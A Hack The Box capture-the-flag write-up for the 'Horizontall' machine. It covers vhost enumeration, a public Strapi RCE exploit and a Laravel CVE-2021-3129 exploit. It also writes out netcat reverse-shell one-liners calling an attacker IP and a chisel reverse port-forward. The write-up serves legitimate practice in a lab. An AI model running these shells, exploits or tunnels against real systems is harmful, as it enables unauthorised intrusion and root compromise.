---
title: "Horizontall Hackthebox writeup"
author: "0xMesbaha"
cover: "/media/Horizontall/start.png"
tags: ["Hackthebox", "Port forwarding", "chisel"]
date: 2022-02-04T00:45:09+02:00
draft: false
---

we got low-privilege access due to Vulnerable version of strapi CMS then got root access because of the Vulnerable Version of Laravel. main techniques used are : Vhost enumeration and port forwarding without ssh

<!--more-->


# Scanning :  

to make our life easier will export ip to use the variable $IP instead of re-typing ip
```
$export IP=10.10.11.105
```

starting with a basic scanning :

```bash
$nmap -sV -v $IP -oN nmap/intial
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)

```

when try to visit http it can't be opened which is an indicator we will need to make Vhost enumeration Latter

![error](/media/Horizontall/20210906143308.png)

so you need to add it to /etc/hosts

![error](/media/Horizontall/20210906143207.png)


### directory Busting :

```bash
$ gobuster dir -u "http://horizontall.htb/" -w /usr/share/wordlists/dirb/common.txt   
```

results :

```bash
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/favicon.ico          (Status: 200) [Size: 4286]                                 
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/index.html           (Status: 200) [Size: 901]                                  
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/]

```

### Vhosts enumeration :
```bash
$ gobuster vhost -u horizontall.htb  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

you can also use ffuf like this :

```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.Horizontall.htb" -u http://horizontall.htb/ -c -fc 301
```
-fc : filter by code u don't want

```bash
results:
www                     [Status: 200, Size: 901, Words: 43, Lines: 2]
api-prod                [Status: 200, Size: 413, Words: 76, Lines: 20]
```
add api-prod to the /etc/hosts
![error](/media/Horizontall/20210906150314.png)

## Foothold :

![error](/media/Horizontall/20210906150257.png)


### Directory Busting :

```bash
$ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://api-prod.horizontall.htb/FUZZ

```

results :
```bash
Admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
ADMIN                   [Status: 200, Size: 854, Words: 98, Lines: 17]
admin                   [Status: 200, Size: 854, Words: 98, Lines: 17]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1]
index.html              [Status: 200, Size: 413, Words: 76, Lines: 20]
reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1]
robots.txt              [Status: 200, Size: 121, Words: 19, Lines: 4]
users                   [Status: 403, Size: 60, Words: 1, Lines: 1]
```

![error](/media/Horizontall/20210906150553.png)

searching for strapi exploit and found RCE exploit [here](https://www.exploit-db.com/raw/50239)

as we see it is a blind RCE we can verify it is valid By pinging our host :

![error](/media/Horizontall/20210906152020.png)

so let's get our reverse shell :

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <my_ip> 9999 >/tmp/f
```
### stablize the shell  :
```python
python -c "import pty;pty.spawn('/bin/bash')"
```

### we are in

![](/media/Horizontall/20210906143208.png)

## Privilege escalation :

after some manual enumeration i tried to see what are the ports running on this machine with
```bash
ss -lpnut
```
and found this :

```
Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port                                                                                   
tcp    LISTEN   0        128             127.0.0.1:8000          0.0.0.0:*
```

you can also run [LinEnum](https://github.com/rebootuser/LinEnum) and reach the same conclusion

this port wasn't in the nmap scan so it isn't publiclly exposed.

to verify this is a path we can take to look for an escalation Factor i tried to see what is the service running at this port :

![](/media/Horizontall/20210906143218.png)

and at the bottom of the output i found :

```bash
Laravel v8 (PHP v7.4.18)
```
searching if it has an exploit and found many so we can now do **port forwarding** to see the web page at our browser and deal with it

## port forwading

we have many ways to achieve that i tried ssh remote port forwarding But it doesn't work , so i used [chisel](https://github.com/jpillora/chisel/releases)

- download version on your side and upload same version on the victim side

so what we are going to do here is port forward 8000 at this machine to 8000 at our machine and the traffic is through port 12312

> commands :

on server side (my side) :

`$./chisel_1.7.6_linux_amd64 server -p 12312 --reverse`

on victim side :

`$ ./chisel_1.7.6_linux_amd64 client <my_ip>:12312 R:8000:127.0.0.1:8000`


![error](/media/Horizontall/20210906154327.png)


now as we said before this laravel version has exploits i used [this](https://github.com/nth347/CVE-2021-3129_exploit/blob/master/exploit.py) one

testing it :

![error](/media/Horizontall/20210906154800.png)

so let's get a reverse shell Finally as root

```bash
python3 exploit.py "http://127.0.0.1:8000" Monolog/RCE1 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <my_ip> 8888 >/tmp/f"
```

![error](/media/Horizontall/20210906154921.png)



pwned on 5 september 2021 .
